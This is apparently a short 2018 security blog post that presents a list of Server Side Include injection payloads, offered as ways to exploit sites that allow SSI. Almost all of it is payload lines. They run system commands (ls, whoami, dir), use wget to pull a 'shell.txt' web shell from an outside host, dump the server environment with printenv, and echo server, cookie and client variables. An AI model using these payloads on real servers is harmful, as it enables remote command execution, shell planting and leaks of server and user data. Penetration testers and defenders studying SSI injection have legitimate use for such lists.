---
title: "List of Server Side Include (SSI) Payloads"
date: 2018-03-24T19:18:53
categories: ["Security", "Tuts"]
tags: ["hack", "tutorial"]
image: /assets/uploads/2018/03/cover-1.jpg
---

Recently I faced a situation that a website allowed the use of Server Side Includes. This was something new for me because I didn’t know many things about it and what payloads I could use. Luckily every time someone in the team already knows about it and below is a list of payloads that can be used to exploit this feature.

```
<pre><!--#exec cmd="ls" --></pre>
<pre><!--#echo var="DATE_LOCAL" --> </pre>
<pre><!--#exec cmd="whoami"--></pre>
<pre><!--#exec cmd="dir" --></pre>
<!--#exec cmd="ls" -->
<!--#exec cmd="wget http://website.com/dir/shell.txt" -->
<!--#exec cmd="/bin/ls /" -->
<!--#exec cmd="dir" -->
<!--#exec cmd="cd C:\WINDOWS\System32">
<!--#config errmsg="File not found, informs users and password"-->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#config timefmt="A %B %d %Y %r"-->
<!--#fsize file="ssi.shtml" -->
<!--#include file=?UUUUUUUU...UU?-->
<!--#echo var="DATE_LOCAL" --> 
<!--#exec cmd="whoami"--> 
<!--#printenv -->
<!--#flastmod virtual="echo.html" -->
<!--#echo var="auth_type" -->
<!--#echo var="http_referer" -->
<!--#echo var="content_length" -->
<!--#echo var="content_type" -->
<!--#echo var="http_accept_encoding" -->
<!--#echo var="forwarded" -->
<!--#echo var="document_uri" -->
<!--#echo var="date_gmt" -->
<!--#echo var="date_local" -->
<!--#echo var="document_name" -->
<!--#echo var="document_root" -->
<!--#echo var="from" -->
<!--#echo var="gateway_interface" -->
<!--#echo var="http_accept" -->
<!--#echo var="http_accept_charset" -->
<!--#echo var="http_accept_language" -->
<!--#echo var="http_connection" -->
<!--#echo var="http_cookie" -->
<!--#echo var="http_form" -->
<!--#echo var="http_host" -->
<!--#echo var="user_name" -->
<!--#echo var="unique_id" -->
<!--#echo var="tz" -->
<!--#echo var="total_hits" -->
<!--#echo var="server_software" -->
<!--#echo var="server_protocol" -->
<!--#echo var="server_port" -->
<!--#echo var="server_name -->
<!--#echo var="server_addr" -->
<!--#echo var="server_admin" -->
<!--#echo var="script_url" -->
<!--#echo var="script_uri" -->
<!--#echo var="script_name" -->
<!--#echo var="script_filename" -->
<!--#echo var="netsite_root" -->
<!--#echo var="site_htmlroot" -->
<!--#echo var="path_translated" -->
<!--#echo var="path_info_translated" -->
<!--#echo var="request_uri" -->
<!--#echo var="request_method" -->    
<!--#echo var="remote_user" -->
<!--#echo var="remote_addr" -->
<!--#echo var="http_client_ip" -->
<!--#echo var="remote_port" -->
<!--#echo var="remote_ident" -->
<!--#echo var="remote_host" -->
<!--#echo var="query_string_unescaped" -->
<!--#echo var="query_string" -->
<!--#echo var="path_translated" -->
<!--#echo var="path_info" -->
<!--#echo var="path" -->
<!--#echo var="page_count" -->
<!--#echo var="last_modified" -->
<!--#echo var="http_user_agent" -->
<!--#echo var="http_ua_os" -->
<!--#echo var="http_ua_cpu" -->
```

You will notice in some cases that it is not possible to run system commands, but it is possible to echo things. One of the payloads that I liked the most was printenv, because it gives a lot of useful information about the server, permissions, local IPs etc.

If you have any more SSI payloads that you would like me to include, feel free to share.

Links: [OWASP](https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection)
